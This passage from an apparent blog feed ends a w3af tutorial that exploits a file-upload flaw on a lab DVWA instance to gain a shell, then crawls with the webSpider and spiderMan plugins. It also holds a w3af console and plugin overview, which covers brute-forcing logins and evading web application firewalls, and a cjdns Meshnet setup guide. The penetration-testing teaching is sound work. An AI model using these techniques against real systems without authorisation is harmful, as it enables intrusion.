&lt;p&gt;&lt;img src=&quot;/images/posts/w3af2/14.png&quot; alt=&quot;14&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Also make sure to check the extensions option in the &lt;em&gt;fileUpload&lt;/em&gt; plugin. Since in some cases, the web application allows only some specific extensions, it would be favorable to add those extensions to the list as well.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af2/15.png&quot; alt=&quot;15&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Click on &lt;em&gt;Start&lt;/em&gt;. As we can see from the output, w3af identified a file Upload vulnerability.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af2/16.png&quot; alt=&quot;16&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Click on the &lt;em&gt;Results&lt;/em&gt; Tab. You can see that w3af tried to upload a file named w3af_dt4LqT.html. It did this by sending the file object in the uploadedfile parameter. It then looked for these files in common directories like uploads etc. If the file is found, then it can be said that a Insecure File Upload vulnerability exists. However, this is not always the case as most of the web application filter files based on their extension. To bypass this w3af has templates for some of the most common file extensions. These templates have valid extensions but have a section that can be replaced with scripting code. The figure below shows the files with different extensions present in w3af.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af2/17.png&quot; alt=&quot;17&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If we open up any of these files with Kate, we can see the content inside it. As we can see from the figure below, the file template.png has a string of A’s in its comment section. This string can actually be replaced by scripting code like php.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af2/18.png&quot; alt=&quot;18&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With all of these basics out of the way, let’s exploit this vulnerability using the &lt;em&gt;fileUploadShell&lt;/em&gt; plugin. You can also set the configuration of these plugins by right clicking on them and clicking on &lt;em&gt;Configure the plugin&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;As we can see from the figure below, the vulnerability was successfully exploited and we got a shell on the target machine.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af2/19.png&quot; alt=&quot;19&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Similarly you can perform tests for many other exploits like Local File Inclusion, Remote File Inclusion, SQL Injection etc.&lt;/p&gt;

&lt;h2 id=&quot;the-need-of-discovery-plugins&quot;&gt;The Need of Discovery Plugins&lt;/h2&gt;

&lt;p&gt;In our previous tests, all we have been doing is giving the specific vulnerable url’s to w3af. However, this is not how real world Web application Vulnerability scanning works. The web application should itself be capable of identifying different url’s in the web application. These url’s will then serve as different injection points for the audit plugin. This is a good example of how the discovery and audit plugins work together with each other, passing along information.&lt;/p&gt;

&lt;p&gt;Two of the most popular Discovery plugins are webSpider and SpiderMan. Basically webSpider uses the given input URL, makes a request and extracts any links or forms obtained in the response. Using these links, it crawls on looking for more links (possibly injection points). The other plugin named SpiderMan is also a very useful plugin for sites which uses Flash or Javascript. Basically it is difficult for web crawlers to look for information if the website uses Javascript etc. In actual, most of the web crawlers just ignore Javascript completely. This is because it is not able to figure out what the Javascript code is supposed to do. Most of the web crawlers just look for static information like links, forms etc. In case the webSpider crawler hits a login form, it will enter the credentials automatically if the auth plugin is enabled (and all the options on it are filled correctly) and keep crawling ahead.&lt;/p&gt;

&lt;p&gt;In cases where the web application uses Javascript or Flash, the spiderMan plugin should be used. The spiderman plugin starts a proxy, and the user has to navigate through that proxy. Based on the results from the user’s navigation, spiderMan plugin is able to identify different injection points which could be then sent to the different audit plugins for vulnerability scanning. Another important feature of the spiderMan plugin is the ability to save cookies and reuse them. Let’s say we use the spiderMan proxy and login to a form using the browser and receive a cookie. The spiderMan plugin will then send the cookie to the rest of the plugins which can use it to crawl the rest of the application.&lt;/p&gt;

&lt;p&gt;Let’s run the webSpider plugin on the w3af test environment. Give the url of the test environment as the target url, make sure only the webSpider plugin is checked inside discovery plugins and click on &lt;em&gt;Start&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af2/20.png&quot; alt=&quot;20&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see from the Log that the webSpider plugin has been able to identify some new url’s. The graph below gives a good idea of the information obtained with time.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af2/21.png&quot; alt=&quot;21&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As the scan is progressing, go to the Results Tab, click on &lt;em&gt;URLs&lt;/em&gt;. As we can see from the figure below, w3af has made a graphical diagram which defines the web application structure. On the left hand side, you can click on the &lt;em&gt;+&lt;/em&gt; sign to see detailed information about a particular branch.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af2/22.png&quot; alt=&quot;22&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s do another example of webSpider plugin. Give the target as the dvwa login page, make sure the WebSpider plugin is checked and click start. In the result, we obtain a graphical structure of the application as shown below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af2/23.png&quot; alt=&quot;23&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This, however is not correct. This is because DVWA has a whole list of url’s inside the vulnerabilities folder. However webSpider plugin was not able to crawl to that directory because it required us to enter a login form as shown below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af2/24.png&quot; alt=&quot;24&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is where the spiderMan plugin comes into use. A good idea is to use the SpiderMan and WebSpider plugin in conjunction with each other. This is because the SpiderMan plugin will help us in reaching places where the webSpider crawler cannot go, and the webSpider crawler can them carry on from those places to crawl the rest of the web application.&lt;/p&gt;

&lt;p&gt;Let’s do the same test again using the SpiderMan plugin as well. Make sure both SpiderMan and WebSpider plugin are enabled and click on start. Also make sure to check the listen Address and listen port as well.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af2/25.png&quot; alt=&quot;25&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once this is done, we need to configure our browser to use the SpiderMan proxy for navigation. If we have to terminate the SpiderMan plugin, we have to browse to a specific url as clearly indicated in the figure below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af2/26.png&quot; alt=&quot;26&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now we need to configure our browser to use the SpiderMan proxy for navigation. In my case, i changed the port number to 44448. It is usually 44444 by default in w3af.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af2/27.png&quot; alt=&quot;27&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once this is done, log in to the dvwa application (default credentials: admin/password) and start navigating to different url’s. You can see these requests are noted by the spiderMan plugin as shown in the figure below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af2/28.png&quot; alt=&quot;28&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To terminate the spiderMan plugin, browse over to the following url as shown below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af2/29.png&quot; alt=&quot;29&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once this is done, the SpiderMan plugin will terminate and the information will be passed over to the different plugins. As we can see from the figure below, the webSpider plugin has found some new url’s (for e.g http://localhost/dvwa/vulnerabilities/csrf/) to which it was able to crawl to using the information from the spiderMan plugin.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af2/30.png&quot; alt=&quot;30&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If we look at the structure of the application, we see that it is actually correct as even the vulnerabilities section was identified.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af2/32.png&quot; alt=&quot;32&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;In this article, we looked at the various discovery and audit plugins in w3af, how they communicate with each other and looked at some of the ways of exploiting these vulnerabilities by using the exploit plugins available in w3af.&lt;/p&gt;

&lt;p&gt;In the upcoming articles in this series, we are going to look at the following features in w3af.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Using different profiles&lt;/li&gt;
  &lt;li&gt;Using the Manual Request and Fuzzy request feature&lt;/li&gt;
  &lt;li&gt;Using the Mitm proxy and the encoder/decoder features&lt;/li&gt;
  &lt;li&gt;w3af scripting&lt;/li&gt;
  &lt;li&gt;Optimizing w3af scans&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Please drop a comment if you liked the article or if there is something about w3af that you want to see in the upcoming articles.&lt;/p&gt;

&lt;h2 id=&quot;references&quot;&gt;References:&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;w3af User Guide&lt;br /&gt;
&lt;a href=&quot;http://w3af.sourceforge.net/documentation/user/w3afUsersGuide.pdf&quot;&gt;http://w3af.sourceforge.net/documentation/user/w3afUsersGuide.pdf&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;w3af-Plugins and descriptions&lt;br /&gt;
&lt;a href=&quot;http://w3af.sourceforge.net/plugin-descriptions.php&quot;&gt;http://w3af.sourceforge.net/plugin-descriptions.php&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This article was originally published on the &lt;a href=&quot;http://resources.infosecinstitute.com/&quot;&gt;resources&lt;/a&gt; page at &lt;a href=&quot;http://infosecinstitute.com/&quot;&gt;Infosec Institute&lt;/a&gt;. For more information, please visit my author &lt;a href=&quot;http://resources.infosecinstitute.com/author/prateek/&quot;&gt;page&lt;/a&gt;.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>W3af walkthrough Part 1</title>
   <link href="https://bitbrain.github.io/2013/06/13/w3af-walkthrough-part-1.html"/>
   <updated>2013-06-13T08:49:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/06/13/w3af-walkthrough-part-1</id>
   <content type="html">&lt;p&gt;w3af (Web Application audit and attack framework) is a framework for auditing and exploitation of web applications. In this series of articles we will be looking at almost all the features that w3af has to offer and discuss how to use them for Web application Penetration testing. In the first part of this series we will be working with w3af console and getting ourselves familiar with the commands. We will also be looking at the different types of plugins that w3af has to offer and discuss how to use them for optimal performance.&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;Some of the major features of w3af are:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;It has plugins that communicate with each other. For eg. the discovery plugin in w3af looks for different url’s to test for vulnerabilities and passes it on to the audit plugin which then uses these URL’s to search for vulnerabilities.&lt;/li&gt;
  &lt;li&gt;It removes some of the headaches involved in Manual web application testing through its Fuzzy and Manual request generator feature. It can also be configured to run as a MITM proxy. The requests intercepted can be sent to the request generator and then manual web application testing can be performed using variable parameters.&lt;/li&gt;
  &lt;li&gt;It also has features to exploit the vulnerabilities that it finds.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;It is important to understand that no automated web application scanner is perfect and false positives will always occur. With w3af the first and the foremost step is to make sure that we have the latest version. This is very important because w3af developers (Andres Riancho and the w3af team) are constantly fixing bugs and hence it is very important to make sure that we have the most bug free version. To open up w3af console, type in the command as shown in the figure below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af1/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;w3af may ask you to update the version. It is advisable to keep updated with the latest version. Ok, so now that we are in the console, type in &lt;em&gt;help&lt;/em&gt; to look at the list of available commands.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af1/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see the list of available options available to us. Type the &lt;em&gt;keys&lt;/em&gt; command to look at the various shortcuts keys available to us. I recommend you get familiar with them.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af1/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s have a look at the plugins which are available in w3af. Type &lt;em&gt;plugins&lt;/em&gt;. You can see the console output change to &lt;em&gt;w3af/plugins&lt;/em&gt;. Type &lt;em&gt;back&lt;/em&gt; to go back or type &lt;em&gt;help&lt;/em&gt; to display the list of available plugins.&lt;/p&gt;

&lt;p&gt;To know information about a specific plugins, just type &lt;em&gt;help pluginName&lt;/em&gt;. For e.g if i want to know about the discovery plugin, i would type &lt;em&gt;help discovery&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af1/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see that there are about 9 types of different plugins.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;1)Discovery&lt;/strong&gt;- The discovery plugin helps in finding more Url’s, forms etc to be used for vulnerability scanning. This information is then passed over to the audit plugin. There are a number of different discovery plugins like webSpider, spiderMan, hmap etc. All these plugins have a different function. A user can enable one or more plugins at the same time.&lt;/p&gt;

&lt;p&gt;To see the discovery plugins, just type &lt;em&gt;discovery&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af1/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To find specific information about a particular plugin, just type &lt;em&gt;pluginType desc pluginname&lt;/em&gt;. For e.g if i want to know more information about the spiderMan &lt;a href=&quot;index.html&quot; title=&quot;index&quot;&gt;index&lt;/a&gt;plugin i would write the command &lt;em&gt;discovery desc spiderMan&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af1/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;One of the important things to note here is that the spiderMan plugin has 2 configurable parameters. To set the configurable parameters, type in the following commands as shown in the figure below. As you can see from the figure below, i have set the listenPort to 55555.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af1/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here are some other commands that could be used.&lt;/p&gt;

&lt;p&gt;1) discovery pluginType1, pluginType2 - Selects two plugins.&lt;/p&gt;

&lt;p&gt;2) discovery all- Enables all the plugins (not advisable as it may take a long time to finish).&lt;/p&gt;

&lt;p&gt;3) discovery !all - Removes all the enabled plugins.&lt;/p&gt;

&lt;p&gt;4) list discovery enabled - Lists all the plugins currently enabled.&lt;/p&gt;

&lt;p&gt;Here is a screenshot below showing some of these commands in action.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af1/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s now run one of the discovery plugins. I will be using the hmap plugin in discovery to know the version of the server running on a remote host. As you can see from the figure below, i have enabled the hmap plugin.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af1/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once this is done, it is now time to give the location of the target server. Type &lt;em&gt;back&lt;/em&gt; to navigate back. Then type the following commands as shown in the figure below to set the target. As we can see, the target is set by the &lt;em&gt;set target target-address&lt;/em&gt; command.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af1/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once this is done, type &lt;em&gt;back&lt;/em&gt; to navigate back and the type &lt;em&gt;start&lt;/em&gt; to start the plugin. As we can see, w3af has figured out the version of Apache and php running on my server. We will discuss more features of the discovery plugin later.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af1/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2)Audit&lt;/strong&gt;-Audit plugins are used to detect vulnerabilities in the URL’s or forms provided by the discovery plugins. This is where the interaction between plugins in w3af comes to use. The audit plugin has options for testing different types of vulnerabilities like xss, sqli, csrf etc. It does this by injecting different strings in its request and then looking for a specific value (corresponding to the input string) in the response. False positives may occur during this process. If i want to know how the sqli plugin works, i could type in the commands as shown in the figure below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af1/12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Again, i can set the different configuration parameters while selecting a particular plugin. For e.g in the figure below i am increasing the number of checks while performing a XSS audit.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af1/13.png&quot; alt=&quot;13&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;3)Grep&lt;/strong&gt; - The grep plugin is used to find interesting information in the requests and responses going through like email accounts, forms with file upload capabilities, hashes, credit card numbers, email addresses etc. You can set the type of information you want to look for by setting the appropriate plugin. Since the grep plugin only analyzes the request and response, it is important to have some kind of discovery plugin enabled for it to work. Otherwise grep plugins are of no use. As you can see in the figure below i have set grep to use the getMails plugin.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af1/14.png&quot; alt=&quot;14&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;4)Brute force&lt;/strong&gt; - Brute force plugins can be used to brute force login forms as well as http-auth logins. Once the discovery plugin finds any form with form based input or an http-auth input it will automatically launch the brute force attack against it if the corresponding brute force plugin is enabled. Some of the important things to know about the brute force are the configuration parameters.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af1/15.png&quot; alt=&quot;15&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It is advisable that you use your own configuration file for the list of usernames and passwords. Also be sure to take a look at some other options. As you can see in the figure below, i have set the option passEqUser to false simply because i don’t think users wouldn’t have their passwords as the same as their username.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af1/16.png&quot; alt=&quot;16&quot; /&gt;&lt;/p&gt;

&lt;p&gt;One of the other good configurable parameter is the useMails option. This options uses the email addresses that w3af finds (maybe through the grep plugin) to be one of the inputs for the username field. For e.g if one of the usernames is example@infosecinstitute.com, then the username tried would be example. This is another example of how the interaction between the different plugins could make the job much more effective.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;5)Output&lt;/strong&gt; - The output plugin helps us decide the format in which we want the output. w3af supports many formats like console, emailReport, html, xml, text etc. Again you can set various parameters here like the filename, verbosity etc. In the figure below, i have set &lt;em&gt;verbose&lt;/em&gt; to True as i want a very detailed report about the application that i am testing.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af1/17.png&quot; alt=&quot;17&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;6)Mangle&lt;/strong&gt; - The mangle plugin is used to mangle with request and responses on the fly. It has only one plugin named sed (Stream editor) which is used to modify requests and responses using different regular expressions. The expressions should have a specific format. The usage is quite evident from the description.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af1/18.png&quot; alt=&quot;18&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see from the figure below, i have set the plugin to look for the string Yahoo and replace it with Google in the request header.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af1/19.png&quot; alt=&quot;19&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;7)Evasion&lt;/strong&gt;- The evasion plugins uses various techniques to bypass WAF (Web application firewalls). For e.g one of the options rndHexEncode randomly encodes the url in hex format to avoid detection while the plugin fullWidthEncode does a full width encode of the Url to bypass Http content scanning systems using the vulnerability described &lt;a href=&quot;http://www.kb.cert.org/vuls/id/739224&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af1/20.png&quot; alt=&quot;20&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;8)Auth&lt;/strong&gt; - Last but not the least, auth plugin is one of the most important plugins in w3af. It has only one type called generic. This is because while crawling on a target web application, if w3af hits a login form, then it needs to submit the credentials automatically in order to continue looking for information. By using this plugin, we can specify a predefined username/password that w3af should enter when it hits a login form. We need to specify all the parameters for generic in order for it to work successfully.&lt;/p&gt;

&lt;p&gt;In the figure below i am setting options for w3af to successfully log in to DVWA (Damn vulnerable web application) which is located on the address http://10.0.1.24/dvwa&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af1/21.png&quot; alt=&quot;21&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;In this article we discussed about the plugins available in w3af and learnt how to work with the w3af console. In the upcoming articles in this series, we are going to discuss the following topics.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Using different profiles&lt;/li&gt;
  &lt;li&gt;Exploiting a vulnerability found by the audit plugin&lt;/li&gt;
  &lt;li&gt;Using the Manual Request and Fuzzy request feature&lt;/li&gt;
  &lt;li&gt;Using the Mitm proxy and the encoder/decoder features&lt;/li&gt;
  &lt;li&gt;w3af scripting&lt;/li&gt;
  &lt;li&gt;Optimizing w3af scans&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Please drop a comment if you liked the article or if there is something about w3af that you want to see in the upcoming articles.&lt;/p&gt;

&lt;h2 id=&quot;references&quot;&gt;References:&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;w3af User Guide&lt;br /&gt;
&lt;a href=&quot;http://w3af.sourceforge.net/documentation/user/w3afUsersGuide.pdf&quot;&gt;http://w3af.sourceforge.net/documentation/user/w3afUsersGuide.pdf&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This article was originally published on the &lt;a href=&quot;http://resources.infosecinstitute.com/&quot;&gt;resources&lt;/a&gt; page at &lt;a href=&quot;http://infosecinstitute.com/&quot;&gt;Infosec Institute&lt;/a&gt;. For more information, please visit my author &lt;a href=&quot;http://resources.infosecinstitute.com/author/prateek/&quot;&gt;page&lt;/a&gt;.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Defending the Internet with Project Meshnet</title>
   <link href="https://bitbrain.github.io/2013/06/13/defending-the-internet-with-project-meshent.html"/>
   <updated>2013-06-13T08:35:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/06/13/defending-the-internet-with-project-meshent</id>
   <content type="html">&lt;p&gt;Topics related to Internet censorship have been over much debate in the last few years. The main purpose of such internet censorship acts is to deny access to certain information on the internet. This information can be censored throughout the world, or in some cases could be limited to certain countries. Some countries even have their own censorship policies. One of the many examples of such acts is the very famous SOPA (Stop Online Piracy Act), which had provisions to protect the publication of copyright intellectual property on the internet. There are many ways to censor information on the internet like IP address blocking, DNS Filtering, URL Filtering etc.&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;In the past, concerns have been raised over whether Internet censorship is the answer to protect things like online piracy. This is because a site like Google or Facebook that allows its users to share information is not viable for the content that the users put into it. These websites also have facilities where copyright holders can file a complaint and the content could be removed. However, with internet censorship it is possible to block the entire website for the users. An act which has this much power to take down an entire website like Facebook, Twitter basically means the suppression of technology and of a free Unified and Open Internet.&lt;/p&gt;

&lt;h2 id=&quot;project-meshnet&quot;&gt;Project Meshnet&lt;/h2&gt;

&lt;p&gt;Project Meshnet (originally called the Darknet) was born out of this concern and aimed towards setting up an open decentralized and censorship free internet. The project started with a discussion on reddit &lt;a href=&quot;http://www.reddit.com/r/darknetplan&quot;&gt;here&lt;/a&gt;. It was called Project Meshnet as it used the Mesh networking topology in which every node must not only capture and dissemninate its own data, but also serve as a relay for other nodes in the same network. This makes it completely decentralized, i.e without any centralized authority thus making it impossible to censor any form of data.&lt;/p&gt;

&lt;p&gt;Project Meshnet is still in its alpha stages and is available for testing purposes to its users. The future aim of the project is to use a combination of hardware (called Mesh islands) and software (called CJDNS) in setting up a decentralized internet. CJDNS is a routing engine which helps us communicate over the mesh network. Right now, the communication happens over the current internet infrastructure over a network called Hyberboria. The future aim of the project is to set up its own hardware across the globe through which the communication will take place.&lt;/p&gt;

&lt;h2 id=&quot;how-does-it-work&quot;&gt;How Does it Work&lt;/h2&gt;

&lt;p&gt;The meshnet network is built out of its users. The future aim of the project is to have multiple computers connected to each other through a wireless connection over a virtual network interface which we will see soon. All the information is cryptographically protected, meaning that only the user at the destination can see the actual data. Packets are directed from the source to the destination through an intermediate set of nodes until it reaches its final destination. The flow of packets is explained in the wiki section on &lt;a href=&quot;https://wiki.projectmeshnet.org/Getting_started&quot;&gt;project meshnet’s website&lt;/a&gt;. Here’s what it says..&lt;/p&gt;

&lt;p&gt;&lt;em&gt;“In the cjdns net, a packet goes to a router and the router labels the packet with directions to a router which will be able to best handle it. That is, a router which is near by in physical space and has an address which is numerically close to the destination address of the packet. The directions which are added to the packet allow it to go through a number of routers without much handling, they just read the label and bounce the packet wherever the next bits in the label tell them to. Routers have a responsibility to “keep in touch” with other routers that are numerically close to their address and also routers which are physically close to them.”&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;setting-up-cjdns&quot;&gt;Setting up CJDNS&lt;/h2&gt;

&lt;p&gt;The first and foremost thing to note while setting up Project Meshnet is to set up the CJDNS routing engine on your system. In this article we will be looking at setting up Meshnet on Mac OS X operating system. Unfortunately, CJDNS only works with Mac OS X 10.7 or newer.&lt;/p&gt;

&lt;p&gt;First of all, it is important to make sure that you have all the dependencies installed, which includes git and wget. A good thing would be to download the “Command Line Tools for Xcode” from the apple website.&lt;/p&gt;

&lt;p&gt;First, lets clone the latest from CJDNS’s github repository.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/meshnet/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then, go to the cjdns directory and build using the “./do” command as shown in the figure below. You will require to have some dependencies like wget etc installed on your system for doing a proper build. Otherwise, the build would fail.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/meshnet/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The build would take some time so please be patient.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/meshnet/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here’s how it would look like while performing the build. Also, please note that you must have an internet connection during this whole process.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/meshnet/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once the build is complete, you will get a “Build completed successfully” message as shown in the figure below. If you don’t see this message, then something is wrong and the build wasn’t successful.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/meshnet/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now we need to create a config file which will give a public and private key and an IP address for our node. Run the command as shown in the figure below to achieve that task.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/meshnet/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This will create the config file named cjdroute.conf. If you open the file, you will see that we have assigned a Private Key, a Public Key and an IPv6 address. Yes, meshnet runs by tunneling IPv6 packets in UDP/IPv4 packets. This is because CJDNS and Hyperboria are still in the early stages of development.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/meshnet/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Right now, since Meshnet doesn’t have a lot of user base around the world, the Meshnet team has made some public peers available around the world to connect to. Please visit http://wiki.projectmeshnet.org/Public_peers for more info regarding that.&lt;/p&gt;

&lt;p&gt;It’s always good to check if these servers can be reached by pinging them before we connect to them using Meshnet. For e.g, in the figure below i am pinging a server in the United States to see if it is reachable.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/meshnet/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Next, we need to configure the config file to connect to that peer. If you open your config file, you will see the following section in your config file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/meshnet/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We need to provide the information of the peer that we will be connecting to in this file. As you can see from the figure below, i have configured the config file to connect to two peers. We can connect to a maximum of 3 peers at once. We can also add some more options such as Trust and Auth Type. The trust level signifies how much you trust a peer that you are connecting to. It is advisable to use a higher trust value for those nodes to which you have already connected to in the past. The trust feature has not been implemented in Meshnet yet.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/meshnet/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once you are done with setting up the configuration, start up CJDNS by typing the command as shown in the figure below. You will need admin privileges to run the daemon.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/meshnet/12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once you have provided your password, CJDNS will run and you will see the log messages as shown below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/meshnet/13.png&quot; alt=&quot;13&quot; /&gt; &lt;img src=&quot;/images/posts/meshnet/14.png&quot; alt=&quot;14&quot; /&gt;&lt;/p&gt;

&lt;p&gt;CJDNS is now properly running and communicating with the other peers. If you do a quick “ifconfig” on your system, you will see that a new interface by the name “utun0” has been created. This is the interface used by Meshnet to communicate with the other peers in Hyperboria.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/meshnet/15.png&quot; alt=&quot;15&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;The aim of Project Meshnet is to build a decentralized internet. This will enable users to exchange information easily without a central authority like an ISP which can block or filter their traffic. In this article we looked at how to set up Meshnet on our local system and used the network Hyperboria to initiate connections between some publicly available peers.&lt;/p&gt;

